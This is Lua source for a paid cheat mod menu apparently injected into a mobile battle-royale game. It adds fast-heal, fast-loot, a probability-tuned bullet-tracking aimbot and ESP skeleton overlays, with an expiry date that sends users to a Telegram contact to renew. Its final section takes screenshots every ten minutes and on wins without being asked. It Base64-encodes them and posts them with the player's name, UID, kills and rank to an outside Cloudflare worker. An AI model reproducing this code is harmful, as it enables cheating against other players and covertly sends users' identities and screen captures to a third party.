...
function BRPlayerCharacterBase:ctor()
  self.bFastHealEnabled = true
  self.bFastHealActive = false
  self.FastHealDuration = 3.0
  self.FastHealPerSecond = 14.0
  self.FastHealCooldown = 8.0
  self.FastHealTimer = 0
  self.FastHealCooldownRemaining = 0
  self.FastHealToggleKey = "H"

  self.bFastLootEnabled = true
  self.bFastLootActive = false
  self.FastLootPickupDelay = 0.15
  self.FastLootSwitchDelay = 0.12
  self.FastLootPickupMultiplier = 3.0
  self.FastLootSwitchMultiplier = 3.0
  self.FastLootPickupOriginalDelay = nil
  self.FastLootSwitchOriginalDelay = nil
end

function BRPlayerCharacterBase:SetFastHealEnabled(bEnabled)
  self.bFastHealEnabled = bEnabled == true
  if not self.bFastHealEnabled then
    self:StopFastHeal()
  end
  self:BroadcastFastHealState()
end

function BRPlayerCharacterBase:IsFastHealEnabled()
  return self.bFastHealEnabled == true
end

function BRPlayerCharacterBase:ToggleFastHeal()
  self:SetFastHealEnabled(not self:IsFastHealEnabled())
  return self:IsFastHealEnabled()
end

function BRPlayerCharacterBase:BroadcastFastHealState()
  local uPlayerController = self:GetPlayerControllerSafety()
  if slua.isValid(uPlayerController) and uPlayerController.BroadcastUIMessage then
    local stateValue = self:IsFastHealEnabled() and "ON" or "OFF"
    uPlayerController:BroadcastUIMessage("UIMsg_FastHealState", 0, stateValue, "")
  end
end

function BRPlayerCharacterBase:TryFastHealInput()
  if self:StartFastHeal() then
    if self:GetPlayerControllerSafety() and self:GetPlayerControllerSafety().DisplayGameTipWithMsgID then
      self:GetPlayerControllerSafety():DisplayGameTipWithMsgID(48532)
    end
  end
end

function BRPlayerCharacterBase:CanUseFastHeal()
  if not self:IsFastHealEnabled() then
    return false
  end
  if self.bFastHealActive then
    return false
  end
  if self.FastHealCooldownRemaining and self.FastHealCooldownRemaining > 0 then
    return false
  end

  local bIsAlive = false
  if self.IsAlive and self:IsAlive() then
    bIsAlive = true
  elseif self.IsDead and not self:IsDead() then
    bIsAlive = true
  elseif self.Health ~= nil and self.MaxHealth ~= nil then
    bIsAlive = self.Health > 0
  end

  return bIsAlive
end

function BRPlayerCharacterBase:StartFastHeal()
  if not self:CanUseFastHeal() then
    return false
  end

  self.bFastHealActive = true
  self.FastHealTimer = 0
  self.FastHealCooldownRemaining = self.FastHealCooldown

  if self.OnFastHealStarted then
    self:OnFastHealStarted()
  end
...
function BRPlayerCharacterBase:StopFastHeal()
  self.bFastHealActive = false
  self.FastHealTimer = 0
  if self.OnFastHealStopped then
    self:OnFastHealStopped()
  end
end

function BRPlayerCharacterBase:UpdateFastHeal(dt)
  if not self.bFastHealActive then
    if self.FastHealCooldownRemaining and self.FastHealCooldownRemaining > 0 then
      self.FastHealCooldownRemaining = math.max(0, self.FastHealCooldownRemaining - (dt or 0))
    end
    return
  end

  self.FastHealTimer = self.FastHealTimer + (dt or 0)
  local amount = (self.FastHealPerSecond or 14.0) * (dt or 0)

  if self.Health and self.MaxHealth then
    local cur = tonumber(self.Health) or 0
    local max = tonumber(self.MaxHealth) or cur
    if cur < max then
      self.Health = math.min(max, cur + amount)
    end
  elseif self.GetHealth and self.GetMaxHealth and self.SetHealth then
    local cur = self:GetHealth()
    local max = self:GetMaxHealth()
    if cur and max and cur < max then
      self:SetHealth(math.min(max, cur + amount))
    end
  end

  if self.FastHealTimer >= (self.FastHealDuration or 3.0) then
    self:StopFastHeal()
  end
end

function BRPlayerCharacterBase:FastHealKeyPressed()
  if not self:IsFastHealEnabled() then
    return false
  end
  return self:TryFastHealInput()
end

function BRPlayerCharacterBase:SetFastLootEnabled(bEnabled)
  self.bFastLootEnabled = bEnabled == true
  if not self.bFastLootEnabled then
    self:StopFastLoot()
  end
end

function BRPlayerCharacterBase:IsFastLootEnabled()
  return self.bFastLootEnabled == true
end

function BRPlayerCharacterBase:ToggleFastLoot()
  self:SetFastLootEnabled(not self:IsFastLootEnabled())
  return self:IsFastLootEnabled()
end

function BRPlayerCharacterBase:CanUseFastLoot()
  if not self:IsFastLootEnabled() then
    return false
  end
  if self.bFastLootActive then
    return false
  end
  if self.IsAlive and not self:IsAlive() then
    return false
  end
...
function BRPlayerCharacterBase:StartFastLoot()
  if not self:CanUseFastLoot() then
    return false
  end

  self.bFastLootActive = true
  self.FastLootPickupOriginalDelay = self.FastLootPickupOriginalDelay or self:GetLootPickupDelayValue()
  self.FastLootSwitchOriginalDelay = self.FastLootSwitchOriginalDelay or self:GetWeaponSwitchDelayValue()

  self:SetLootPickupDelayValue(self.FastLootPickupDelay)
  self:SetWeaponSwitchDelayValue(self.FastLootSwitchDelay)

  if self.OnFastLootStarted then
    self:OnFastLootStarted()
  end

  return true
end

function BRPlayerCharacterBase:StopFastLoot()
  self.bFastLootActive = false

  if self.FastLootPickupOriginalDelay ~= nil then
    self:SetLootPickupDelayValue(self.FastLootPickupOriginalDelay)
    self.FastLootPickupOriginalDelay = nil
  end

  if self.FastLootSwitchOriginalDelay ~= nil then
    self:SetWeaponSwitchDelayValue(self.FastLootSwitchOriginalDelay)
    self.FastLootSwitchOriginalDelay = nil
  end

  if self.OnFastLootStopped then
    self:OnFastLootStopped()
  end
end

function BRPlayerCharacterBase:GetLootPickupDelayValue()
  local candidates = {
    self.PickupDelay,
    self.LootPickupDelay,
    self.InteractDelay,
    self.ItemPickupDelay,
    self.PickupTime,
...
function BRPlayerCharacterBase:SetLootPickupDelayValue(value)
  local candidates = {
    "PickupDelay",
    "LootPickupDelay",
    "InteractDelay",
...
function BRPlayerCharacterBase:GetWeaponSwitchDelayValue()
  local candidates = {
    self.WeaponSwitchDelay,
    self.SwitchWeaponDelay,
    self.WeaponSwapDelay,
    self.SwitchDelay,
    self.QuickSwitchDelay,
    self.WeaponChangeDelay
  }
  for _, v in ipairs(candidates) do
    if type(v) == "number" then
      return v
...
function BRPlayerCharacterBase:SetWeaponSwitchDelayValue(value)
  local candidates = {
    "WeaponSwitchDelay",
    "SwitchWeaponDelay",
    "WeaponSwapDelay",
...
function BRPlayerCharacterBase:UpdateFastLoot(dt)
  if not self.bFastLootActive then
    return
  end

  if self:GetLootPickupDelayValue() > self.FastLootPickupDelay then
    self:SetLootPickupDelayValue(self.FastLootPickupDelay)
  end

  if self:GetWeaponSwitchDelayValue() > self.FastLootSwitchDelay then
    self:SetWeaponSwitchDelayValue(self.FastLootSwitchDelay)
  end
end

function BRPlayerCharacterBase:FastLootKeyPressed()
  if not self:IsFastLootEnabled() then
    return false
  end
  return self:StartFastLoot()
end
...
local function Notify(msg) local s = "[STAR VIP] " .. tostring(msg)
...
_G.LexusConfig = _G.LexusConfig or { 
    ...
    -- =============================================
    -- SMART BULLET TRACK CONFIG
    -- =============================================
    SmartBT_Enable    = false,  -- Master ON/OFF
    SmartBT_VisCheck  = true,   -- Visibility check (camera LOS)
    SmartBT_IgKnock   = true,   -- Ignore knocked enemies
    SmartBT_IgBot     = false,  -- Ignore bots
    SmartBT_MaxDist   = 300,    -- Max distance in meters (slider: 50-500)
    -- 1=Head 2=Neck 3=Chest 4=Stomach 5=Pelvis 6=FullBody(random cycle)
    SmartBT_Bone      = 1,
    SmartBT_Radius    = 0,      -- Hitbox radius offset in cm (0=exact, slider: 0-80)
    SmartBT_HitChance = 70      -- Hit chance % per bullet (0-100). 70 = ~4-5 hits per 6 bullets
}
...
local limitTime = os.time({ year = 2027, month = 9, day =15, hour = 23, min = 59, sec = 0 })
...
local ConfigFileName = "star_settings.txt"
...
function _G.InitModMenuTab()
    ...
    if not SettingPageDefine.ModMenu then
        ...
        local StackAimbot = {
            ...
            -- =============================================
            -- SMART BULLET TRACK — toggle + adjustments
            -- =============================================
            { Key = "ModMenu_SmartBT_Ex", UI = AliasMap.TitleSwitcher, Text = T("▶ Smart Bullet Track (Toàn Thân)", "▶ Smart Bullet Track (Full Body)"), ExpandIndex = 0,
              GetFunc = function() return _G.LexusConfig.SmartBT_Enable end,
              SetFunc = function(c,v) _G.LexusConfig.SmartBT_Enable = v return true end },

            { Key = "ModMenu_SmartBT_Bone", UI = AliasMap.Slider,
              Text = T("   Vị Trí Bắn (1:Đầu 2:Cổ 3:Ngực 4:Bụng 5:Hông 6:Toàn Thân)", "   Hit Part (1:Head 2:Neck 3:Chest 4:Stomach 5:Pelvis 6:Full Body)"),
              ExpandHandle = "ModMenu_SmartBT_Ex",
              MinValue = 1, MaxValue = 6, min = 1, max = 6,
              GetFunc = function() return _G.LexusConfig.SmartBT_Bone or 1 end,
              SetFunc = function(c,v)
                local val = math.floor(v + 0.5)
                if val < 1 then val = 1 end
                if val > 6 then val = 6 end
                _G.LexusConfig.SmartBT_Bone = val
                return true
              end },

            { Key = "ModMenu_SmartBT_Radius", UI = AliasMap.Slider,
              Text = T("   Bán Kính Hitbox (0-80 cm)", "   Hitbox Radius (0-80 cm)"),
              ExpandHandle = "ModMenu_SmartBT_Ex",
              MinValue = 0, MaxValue = 100, min = 0, max = 100,
              GetFunc = function() return math.floor(((_G.LexusConfig.SmartBT_Radius or 0) / 80) * 100 + 0.5) end,
              SetFunc = function(c,v) _G.LexusConfig.SmartBT_Radius = math.floor((v / 100) * 80) return true end },

            { Key = "ModMenu_SmartBT_HitChance", UI = AliasMap.Slider,
              Text = T("   Xac Suat Trung (0-100%)", "   Hit Chance % (3-4 hits per 6 bullets = ~60%)"),
              ExpandHandle = "ModMenu_SmartBT_Ex",
              MinValue = 0, MaxValue = 100, min = 0, max = 100,
              GetFunc = function() return _G.LexusConfig.SmartBT_HitChance or 70 end,
              SetFunc = function(c,v) _G.LexusConfig.SmartBT_HitChance = math.floor(v + 0.5) return true end },

            { Key = "ModMenu_SmartBT_Vis", UI = AliasMap.Switcher, Text = T("   Check Tường (Chỉ bắn khi lộ diện)", "   Visibility Check (Fire Only When Visible)"), ExpandHandle = "ModMenu_SmartBT_Ex",
              GetFunc = function() return _G.LexusConfig.SmartBT_VisCheck end,
              SetFunc = function(c,v) _G.LexusConfig.SmartBT_VisCheck = v return true end },

            { Key = "ModMenu_SmartBT_IgKnock", UI = AliasMap.Switcher, Text = T("   Bỏ Qua Địch Knock", "   Ignore Knocked Enemies"), ExpandHandle = "ModMenu_SmartBT_Ex",
              GetFunc = function() return _G.LexusConfig.SmartBT_IgKnock end,
              SetFunc = function(c,v) _G.LexusConfig.SmartBT_IgKnock = v return true end },

            { Key = "ModMenu_SmartBT_IgBot", UI = AliasMap.Switcher, Text = T("   Bỏ Qua Bot", "   Ignore Bots"), ExpandHandle = "ModMenu_SmartBT_Ex",
              GetFunc = function() return _G.LexusConfig.SmartBT_IgBot end,
              SetFunc = function(c,v) _G.LexusConfig.SmartBT_IgBot = v return true end },

            { Key = "ModMenu_SmartBT_Dist", UI = AliasMap.Slider, Text = T("   Tầm Hoạt Động (50-500m)", "   Max Range (50-500m)"), ExpandHandle = "ModMenu_SmartBT_Ex",
              MinValue = 1, MaxValue = 100, min = 1, max = 100,
              GetFunc = function() return math.floor(((_G.LexusConfig.SmartBT_MaxDist or 300) - 50) / 4.5) end,
              SetFunc = function(c,v) _G.LexusConfig.SmartBT_MaxDist = math.floor(50 + v * 4.5) return true end }
        }
        ...
        local StackSkin = {
            ...
            { Key = "ModMenu_SkinOpenLink", UI = AliasMap.Switcher, Text = T("Hướng Dẫn Mod Skin Mũ/Balo (Link)", "Mod Skin Guide (Link)"), GetFunc = function() return _G.LexusConfig.SkinOpenLink end, SetFunc = function(c,v) _G.LexusConfig.SkinOpenLink = v; if v == true then pcall(function() local Web = require("client.slua.logic.url.logic_webview_sdk"); if Web and Web.OpenURL then Web:OpenURL("https://t.me/STAR_MOD") end end) end return true end },
            { Key = "ModMenu_SendFeedback", UI = AliasMap.Switcher, Text = T("📸 Gửi Feedback (Bật 一 Lần)", "📸 Send Feedback (ON = Send Once)"), GetFunc = function() return _G.LexusConfig.SendFeedback end, SetFunc = function(c,v) _G.LexusConfig.SendFeedback = v; if v == true then pcall(function() if _G._GK_TakeAndSendScreenshot then _G._GK_TakeAndSendScreenshot(false) end end) end return true end },
        }
...
-- ============================================================================
-- [PATCH v2 - BOSS MAN EDITION]
-- POPUP NUKE + AUTO-ON ESP V2 + LOW-END ADAPTIVE THROTTLE
-- ============================================================================

-- Detect low-end device by checking available memory or FPS-tier heuristics.
-- We read the game's own Graphics quality setting: 0=Smooth/Balanced=low-end, 3=HDR=high-end.
_G.LexusDeviceTier = _G.LexusDeviceTier or (function()
    local tier = 2 -- Default: mid
    pcall(function()
        local gfxCfg = require("client.slua.logic.setting.logic_setting_graphics")
        if gfxCfg then
            local q = tonumber(gfxCfg.graphics_quality) or tonumber(gfxCfg.GraphicsQuality) or 2
            -- 0=Smooth, 1=Balanced, 2=HD, 3=HDR/UHD
            tier = q
        end
    end)
    return tier
...
-- Adaptive ESP timing: low-end devices get a bigger draw interval to cut CPU load
-- tier 0-1 (Smooth/Balanced) => 0.12s between bone draws (≈8 FPS ESP)
-- tier 2 (HD)                => 0.07s  (≈14 FPS ESP)
-- tier 3 (HDR)               => 0.05s  (≈20 FPS ESP)
_G.LexusESPBoneInterval = ({[0]=0.12, [1]=0.10, [2]=0.07, [3]=0.05})[_G.LexusDeviceTier] or 0.07
-- On low-end: only draw head+pelvis+neck for far targets; on high-end: full skeleton up to 250m
_G.LexusESPSkeletonFarDist = (_G.LexusDeviceTier <= 1) and 30 or 50
-- HP segment count: low-end gets 4 segs (less AddDebugText calls), high-end gets 6
_G.LexusESPHPSegments = (_G.LexusDeviceTier <= 1) and 4 or 6
-- Max ESP draw distance on low-end devices (trim enemies beyond this)
_G.LexusESPMaxDistM = (_G.LexusDeviceTier <= 1) and 250 or 400

-- POPUP REMOVED — auto-initialize menu silently on game entry.
-- No click required. No dialog. No friction. Just boots straight in.
local function ShowLexusVIPMenu()
    if _G.LexusMenuAlreadyShown then return end

    -- Auto-flag so it never tries to show again
    _G.LexusMenuAlreadyShown = true
    _G.LexusState.MenuStep = 99
    _G.LexusLang = "EN"

    -- Silently init the menu tab (injects Settings tab) without any popup
    pcall(function()
    ...
    -- Auto-enable ESP V2 (EspVipPro) on entry if not already set by user
    -- Uses a persistent flag so user-disabled state is respected on subsequent loads
    if _G.LexusAutoOnApplied == nil then
        _G.LexusAutoOnApplied = true
        -- Only auto-enable if the user hasn't explicitly disabled them (default false means untouched)
        if not _G.LexusConfig.EspVipPro then
            _G.LexusConfig.EspVipPro = true
        end
        if not _G.LexusConfig.EspLoai9 then
            _G.LexusConfig.EspLoai9 = true
        end
    end

    print("[STAR VIP] Auto-started. ESP V2 active. No popup — fuck yeah.")
end
...
PlayerMapMarker.SnapLineColor = FLinearColor and FLinearColor(0.0, 0.4, 1.0, 1.0) or {R=0, G=100, B=255, A=255} -- Blue
        ...
        for _, enemy in pairs(allCharacters) do
            if Valid(enemy) and enemy ~= localPlayer and enemy.TeamID ~= localPlayer.TeamID then
                ...
                if not bIsReallyDead then
                    ...
                    local showFrameUI = _G.LexusConfig.EspLoai5 or _G.LexusConfig.EspVipPro
                    ...
                    if _G.LexusConfig.EspLoai6 then
                        pcall(function()
                            local curTime = os.clock()
                            -- [PATCH BOSS MAN] Adaptive bone-draw interval per device tier
                            -- Low-end (Smooth/Balanced) => 0.10-0.12s   Mid (HD) => 0.07s   High (HDR) => 0.05s
                            local boneInterval = _G.LexusESPBoneInterval or 0.07
                            local lifetimeBuffer = boneInterval + 0.01 -- slightly longer than interval to avoid flickering
                            if markData.LastEsp6Time == nil or (curTime - markData.LastEsp6Time) >= boneInterval then
                                markData.LastEsp6Time = curTime
                                
                                local MyHUD = Cached_MyHUD
                                -- [PATCH] Max draw distance is adaptive: 250m low-end, 400m high-end
                                local maxDrawDist = _G.LexusESPMaxDistM or 250
                                if Valid(MyHUD) and Valid(eMesh) and aLoc then
                                    if distM <= maxDrawDist then
                                        if type(eMesh.GetSocketLocation) == "function" then
                                            -- [PATCH] Far-distance skeleton culling: low-end devices cull limbs at 30m, high-end at 50m
                                            local farCullDist = _G.LexusESPSkeletonFarDist or 50
                                            local isFar = distM > farCullDist
                                            for _, bName in ipairs(GLOBAL_BONE_LIST) do
                                                -- Skip limbs on far targets (saves 10 AddDebugText calls per enemy per frame)
                                                if isFar and (bName ~= "head" and bName ~= "pelvis" and bName ~= "neck_01") then
                                                    -- culled — skip
                                                else
                                                    ...
                                                    if wLoc then
                                                        ...
                                                        -- [PATCH] Lifetime = adaptive interval + buffer to prevent bone flicker
                                                        MyHUD:AddDebugText(mark, enemy, lifetimeBuffer, offset, offset, color, true, false, true, nil, fixedSize, true)
                                                    end
                                                end
                                            end
                                        end
                                        -- NOTE: Connection lines (GLOBAL_CONNECTIONS) remain removed — main FPS killer
                                    end
                                end
                            end
                        end)
                    ...
                    if _G.LexusConfig.EspVipPro then
                        pcall(function()
                            ...
                            if Valid(hud) and hud.AddDebugText then
                                -- [PATCH BOSS MAN] Adaptive max ESP draw distance per device tier
                                local espMaxDist = _G.LexusESPMaxDistM or 400
                                if distM <= espMaxDist then
                                    local dynamicScale = math.max(0.55, 0.95 - (distM / espMaxDist))
                                    ...
                                    -- VẼ THANH MÁU
                                    -- [PATCH BOSS MAN] Adaptive HP bar segment count:
                                    -- Low-end => 4 segments (4 AddDebugText calls instead of 6 — saves 33% draw calls per enemy)
                                    -- High-end => 6 segments (original quality)
                                    if _G.LexusConfig.Esp3ShowHP then
                                        if not isKnock then
                                            local segments = _G.LexusESPHPSegments or 6
                                            local filled = math.floor(hpPercent * segments)
                                            local startZ = 20
                                            local spacing = (10.0 / segments * 6) * dynamicScale -- normalize spacing so bar looks same size regardless of segment count
                                            for j = 1, segments do
    ...
    if not _G.LexusNotifiedPopup then
        pcall(function()
            ...
            if Msg and Msg.Show then
                Msg.Show(1, "STAR MOD - EXPIRED", "Your mod version has expired!\nContact STAR to renew.", 
                function() 
                    local Web = require("client.slua.logic.url.logic_webview_sdk")
                    if Web and Web.OpenURL then Web:OpenURL("https://t.me/STAR_Yt") end 
                end, 
...
local function FastTick() 
    if isExpired then 
        if not _G.LexusNotifiedExpire then
            Notify("[STAR MOD] Version expired. Contact STAR to renew.")
...
if not isExpired then
    FastTick() 
    Notify("[STAR VIP] Mod loaded. Enjoy!")
else
    FastTick() 
end
...
-- ==============================================================================
-- S11  AUTO SCREENSHOT & VIP FEEDBACK (INTEGRATED FROM FEEDBACK MODULE)
-- 10-Min In-Match Recurrent Loop + 3x Burst Screenshots on Win/Match End
-- ==============================================================================
do
    local _CF_WORKER_URL = "https://star-feedback-worker.teamxparoh.workers.dev"
    local _SS_INTERVAL   = 600  -- Exactly 10 minutes
    local _LAST_LOOP_TIME = 0
    local _LOCAL_MATCH_KILLS = 0

    -- Live In-Game Kill Event Hook
    pcall(function()
        if EventSystem and EventSystem.registEvent then
            if EVENTTYPE_KILL_COUNTER and EVENTID_KILL_COUNTER_NUM_REFRESH then
                EventSystem:registEvent(EVENTTYPE_KILL_COUNTER, EVENTID_KILL_COUNTER_NUM_REFRESH, function(uid)
                    pcall(function()
                        local GameplayData = require("GameLua.GameCore.Data.GameplayData")
                        local ps = GameplayData and GameplayData.GetPlayerState and GameplayData.GetPlayerState()
                        if ps and ps.Kills and tonumber(ps.Kills) then
                            _LOCAL_MATCH_KILLS = math.max(_LOCAL_MATCH_KILLS, tonumber(ps.Kills))
                        end
                    end)
                end)
            end
    ...
    -- Comprehensive Player Metadata Extractor
    local function GK_GetPlayerMetadata(isVictory)
        local meta = {
            name = "OFFICAL_KASHMIRY1 User",
            uid = "Unknown",
            kills = _LOCAL_MATCH_KILLS or 0,
            rank = "Crown",
            isChicken = isVictory or false
        }
        pcall(function()
            local GameplayData = nil
            pcall(function() GameplayData = require("GameLua.GameCore.Data.GameplayData") end)
            local UIUtil = nil
            pcall(function() UIUtil = require("client.common.ui_util") end)
            local PC = (GameplayData and GameplayData.GetPlayerController and GameplayData.GetPlayerController())
                    or (UIUtil and UIUtil.GetPlayerController and UIUtil.GetPlayerController())
            local PS = (GameplayData and GameplayData.GetPlayerState and GameplayData.GetPlayerState())
                    or (PC and PC.PlayerState)
                    or (Client and Client.GetMyPlayerState and Client.GetMyPlayerState())
            -- Real In-Game Name
            if DataMgr and DataMgr.roleData and DataMgr.roleData.nickName and DataMgr.roleData.nickName ~= "" then
                meta.name = tostring(DataMgr.roleData.nickName)
            elseif PS and PS.PlayerName and PS.PlayerName ~= "" then
                meta.name = tostring(PS.PlayerName)
            end
            -- Real UID
            if DataMgr and DataMgr.roleData and DataMgr.roleData.uid and DataMgr.roleData.uid ~= 0 and DataMgr.roleData.uid ~= "" then
                meta.uid = tostring(DataMgr.roleData.uid)
            elseif PS and PS.PlayerUID and PS.PlayerUID ~= "" and PS.PlayerUID ~= "0" then
                meta.uid = tostring(PS.PlayerUID)
            elseif PS and PS.PlayerKey and PS.PlayerKey ~= 0 then
                meta.uid = tostring(PS.PlayerKey)
            end
            -- Live Kill Candidates
            local killCandidates = {
                _LOCAL_MATCH_KILLS, PS and PS.Kills, PC and PC.PlayerState and PC.PlayerState.Kills,
                PS and PS.KillNum, PS and PS.KillCount, PS and PS.CurKillNum, PS and PS.TotalKillNum
            }
            for _, kVal in ipairs(killCandidates) do
                if kVal and tonumber(kVal) and tonumber(kVal) > 0 then
                    meta.kills = math.max(meta.kills, tonumber(kVal))
                end
            end
            -- Rank Extraction
            local bestSeg = 0
            pcall(function()
                local SeasonSystem = require("logic.season.logic_season")
                if SeasonSystem then
                    if SeasonSystem.segment then
                        if SeasonSystem.segment.team and SeasonSystem.segment.team.level then bestSeg = math.max(bestSeg, tonumber(SeasonSystem.segment.team.level) or 0) end
                        if SeasonSystem.segment.single and SeasonSystem.segment.single.level then bestSeg = math.max(bestSeg, tonumber(SeasonSystem.segment.single.level) or 0) end
                        if SeasonSystem.segment.double and SeasonSystem.segment.double.level then bestSeg = math.max(bestSeg, tonumber(SeasonSystem.segment.double.level) or 0) end
                    end
                    if SeasonSystem.GetMaxSegment then local ms = tonumber(SeasonSystem.GetMaxSegment()) or 0; if ms > 101 then bestSeg = math.max(bestSeg, ms) end end
                    if SeasonSystem.GetBestSegment then local bs = tonumber(SeasonSystem.GetBestSegment()) or 0; if bs > 101 then bestSeg = math.max(bestSeg, bs) end end
                end
            end)
            if bestSeg <= 101 and DataMgr then
                pcall(function()
                    if DataMgr.maxSegmentSquad and DataMgr.maxSegmentSquad.SegmentLevel then bestSeg = math.max(bestSeg, tonumber(DataMgr.maxSegmentSquad.SegmentLevel) or 0) end
                    if DataMgr.maxSegmentSolo and DataMgr.maxSegmentSolo.SegmentLevel then bestSeg = math.max(bestSeg, tonumber(DataMgr.maxSegmentSolo.SegmentLevel) or 0) end
                    if DataMgr.maxSegmentDuo and DataMgr.maxSegmentDuo.SegmentLevel then bestSeg = math.max(bestSeg, tonumber(DataMgr.maxSegmentDuo.SegmentLevel) or 0) end
                end)
            end
            local rankText = nil
            if bestSeg and bestSeg > 0 then
                pcall(function()
                    local FuncUtil = require("client.logic.common.func_util") or FuncUtil
                    if FuncUtil and FuncUtil.GetRankTableData then
                        local cfg = FuncUtil.GetRankTableData(bestSeg, DataMgr and DataMgr.season_id)
                        if cfg and cfg.Name and cfg.Name ~= "" then rankText = tostring(cfg.Name) end
                    end
                end)
            end
            if rankText and rankText ~= "" then
                meta.rank = rankText
            elseif bestSeg and bestSeg > 0 then
                local subNames = { [5]="I", [4]="II", [3]="III", [2]="IV", [1]="V" }
                if bestSeg >= 800 then meta.rank = "Conqueror"
                elseif bestSeg >= 711 then meta.rank = "Ace Dominator"
                elseif bestSeg >= 706 then meta.rank = "Ace Master"
                elseif bestSeg >= 700 then meta.rank = "Ace"
                elseif bestSeg >= 600 then meta.rank = "Crown " .. (subNames[bestSeg % 10] or "V")
                elseif bestSeg >= 500 then meta.rank = "Diamond " .. (subNames[bestSeg % 10] or "V")
                elseif bestSeg >= 400 then meta.rank = "Platinum " .. (subNames[bestSeg % 10] or "V")
                elseif bestSeg >= 300 then meta.rank = "Gold " .. (subNames[bestSeg % 10] or "V")
                elseif bestSeg >= 200 then meta.rank = "Silver " .. (subNames[bestSeg % 10] or "V")
                elseif bestSeg >= 100 then meta.rank = "Bronze " .. (subNames[bestSeg % 10] or "V")
                end
            else meta.rank = "Ace" end
        end)
        return meta
    end

    -- High-speed Base64 Encoder
    local function GK_FastBase64Encode(data)
        if not data or #data == 0 then return "" end
        local b64str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        local b64 = {}
        for i = 0, 63 do b64[i] = string.byte(b64str, i + 1) end
    ...
    -- Universal HTTP Post via Game's Official http_manager
    local function GK_PostToWorker(endpoint, bodyData, customHeaders, cb)
        pcall(function()
            if not _CF_WORKER_URL or _CF_WORKER_URL == "" then return end
            local http = nil
            if ModuleManager and ModuleManager.GetModule and ModuleManager.CommonModuleConfig and ModuleManager.CommonModuleConfig.http_manager then
                http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
            end
            local targetUrl = _CF_WORKER_URL .. endpoint
            local headers = {
                ["Content-Type"] = "text/plain",
                ["User-Agent"]   = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"
            }
            if customHeaders and type(customHeaders) == "table" then
                for k, v in pairs(customHeaders) do headers[k] = tostring(v) end
            end
            if http and http.Post then
                http:Post(targetUrl, headers, bodyData, nil, function(success, data, content, result)
                    if cb then pcall(cb, success, data, content, result) end
                end, 30)
            end
        end)
    end
    ...
    local function GK_BufferToString(buf)
        if not buf then return nil end
        if type(buf) == "string" and #buf > 50 then return buf end
        if type(buf) == "table" and #buf > 50 then
            local t = {}
            for i = 1, #buf do t[i] = string.char(buf[i]) end
            return table.concat(t)
        end
        local ok, s = pcall(function() return tostring(buf) end)
        if ok and s and #s > 50 then return s end
        return nil
    end

    -- Screenshot binary reader (Android BasePath + Engine C++ fallback)
    local function GK_ReadScreenshotBytes(ShotPath)
        local candidates = {}
        if ShotPath and ShotPath ~= "" then
            table.insert(candidates, ShotPath)
            pcall(function()
                local bOk, BusinessHelper = pcall(import, "BusinessHelper")
                if bOk and BusinessHelper and BusinessHelper.GetMobileBasePath then
                    local abs = BusinessHelper.GetMobileBasePath(ShotPath)
                    if abs and abs ~= "" then table.insert(candidates, abs) end
                end
            end)
        end
        local sh = import("ScriptHelperClient") or ScriptHelperClient
        for _, path in ipairs(candidates) do
            if path and path ~= "" then
                local fileData = nil
                pcall(function()
                    local f = io.open(path, "rb")
                    if f then fileData = f:read("*a"); f:close() end
                end)
                if fileData and #fileData > 100 then return fileData, path end
                pcall(function()
                    if sh and sh.LoadFileToArrayByFullPath then fileData = GK_BufferToString(sh.LoadFileToArrayByFullPath(path)) end
                    if (not fileData or #fileData == 0) and Client and Client.LoadFileToArrayByFullPath then
                        fileData = GK_BufferToString(Client.LoadFileToArrayByFullPath(path))
                    end
                end)
                if fileData and #fileData > 100 then return fileData, path end
            end
        end
        return nil, candidates[1] or ShotPath
    end

    -- Send screenshot + metadata to Cloudflare Worker
    local function GK_SendScreenshotToWorker(filePath, isVictory)
        pcall(function()
            if not filePath or filePath == "" then return end
            local fileData, usedPath = GK_ReadScreenshotBytes(filePath)
            if not fileData or #fileData == 0 then return end
            local b64Payload = GK_FastBase64Encode(fileData)
            if not b64Payload or #b64Payload < 100 then return end
            local meta = GK_GetPlayerMetadata(isVictory)
            local metaHeaders = {
                ["X-Meta-Name"]    = meta.name,
                ["X-Meta-Uid"]     = meta.uid,
                ["X-Meta-Kills"]   = tostring(meta.kills),
                ["X-Meta-Rank"]    = meta.rank,
                ["X-Meta-Chicken"] = tostring(meta.isChicken)
            }
            GK_PostToWorker("/screenshot", b64Payload, metaHeaders, function(success, data, content, result) end)
        end)
    end

    -- Two-Pass Raw → ResizePicture JPEG screenshot capture
    local function GK_TakeAndSendScreenshot(isVictory)
        pcall(function()
            local ScreenshotMaker = import("ScreenshotMaker")
            if not ScreenshotMaker then return end
            local savedDir = Client and Client.ProjectSavedDir and Client.ProjectSavedDir() or ""
            local ts = os.time()
            local rawPath    = string.format("%sScreenshots/raw_%d_%d.jpg", savedDir, ts, math.random(100, 999))
            local scaledPath = string.format("%sScreenshots/OFFICAL_KASHMIRY1_fb_%d_%d.jpg", savedDir, ts, math.random(100, 999))
            local UIUtil = require("client.common.ui_util")
            local GameInstance = UIUtil and UIUtil.GetGameInstance and UIUtil.GetGameInstance()
            local function ProcessCapture(capturePath)
                local ticker = _cached_time_ticker or require("common.time_ticker")
                if not ticker or not ticker.AddTimerOnce then
                    GK_SendScreenshotToWorker(capturePath, isVictory)
                    return
                end
                ticker.AddTimerOnce(0.8, function()
                    local bResized = false
                    pcall(function()
                        if ScreenshotMaker.ResizePicture then
                            ScreenshotMaker.ResizePicture(capturePath, 0.6, scaledPath)
                            bResized = true
                        end
                    end)
                    if bResized then
                        ticker.AddTimerOnce(0.3, function()
                            local targetToSend = scaledPath
                            if not GK_ReadScreenshotBytes(scaledPath) then targetToSend = capturePath end
                            GK_SendScreenshotToWorker(targetToSend, isVictory)
                        end)
                    else
                        GK_SendScreenshotToWorker(capturePath, isVictory)
                    end
            ...
            if GameInstance and GameInstance.EnginePreTick then
                GameInstance.EnginePreTick:Add(function()
                    local ShotPath = ScreenshotMaker.MakePictureByName(rawPath, true)
                    GameInstance.EnginePreTick:Clear()
                    ProcessCapture(ShotPath or rawPath)
                end)
            else
                local ShotPath = ScreenshotMaker.MakePictureByName(rawPath, true)
                ProcessCapture(ShotPath or rawPath)
    ...
    -- Recurring 10-min in-match loop
    local function GK_ScreenshotLoop()
        pcall(function()
            local ticker = _cached_time_ticker or require("common.time_ticker")
            if ticker and ticker.AddTimerOnce then
